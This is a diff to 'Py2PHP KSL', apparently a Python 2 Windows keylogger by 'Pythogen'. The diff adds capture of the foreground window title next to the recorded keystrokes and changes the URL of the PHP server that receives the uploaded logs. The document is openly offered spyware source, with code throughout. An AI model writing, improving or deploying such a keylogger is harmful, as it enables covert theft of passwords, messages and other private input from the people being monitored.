@@ -4,7 +4,7 @@
 # |   __| | |  _|   | . | . | -_|   |
 # |__|  |_  |_| |_|_|___|_  |___|_|_|
 #       |___|           |___|        
-# Py2PHP KSL
+# Py2PHP KSL 1.2
 # By Pythogen
 
 # Load modules
@@ -16,8 +16,13 @@ import sys
 import urllib
 import urllib2
 
+# Access DLLs
+user32 = windll.user32
+kernel32 = windll.kernel32
+winTitle = None
+
 # URL to PHP Server to transfer logs.
-log2url = 'http://127.0.0.1:7777/log/index.php'
+log2url = 'http://127.0.0.1/log/index.php'
 
 # Globalize and Initially Declare 
 global charRep
@@ -25,9 +30,30 @@ global charRep
 # Keystroke storage variable
 charRep = 'X'
 
+
+def getWindowTitle():
+	# Get window in focus
+	hwnd = user32.GetForegroundWindow()
+
+	# Extract the window's title
+	title = create_string_buffer("\x00" * 512)
+	length = user32.GetWindowTextA(hwnd, byref(title),512)
+	
+	# Log title name above text input
+	print "\n\n[ %s ]\n" % ( title.value)
+	
+	# Close
+	kernel32.CloseHandle(hwnd)
+
+
 # Main Routine
 def Main():
 
+	# Print program banner
+	print '\npy2PHP Keylogger - Pythogen\n'
+
+	# Enable access to winTitle globally.
+	global winTitle
 	# Enable access to toPHP globally.
 	global toPHP
 
@@ -41,6 +67,15 @@ def Main():
 
 # Key input function
 def KeyIN(event):
+
+	# Globalize title for use
+	global winTitle
+
+	# Construct that makes sure var contains title
+	# Then calls windowTitle function/method
+	if event.WindowName != winTitle:
+		winTitle = event.WindowName
+		getWindowTitle()
 
 	# Variable storing specific key stroke
 	charRep = chr(event.Ascii)
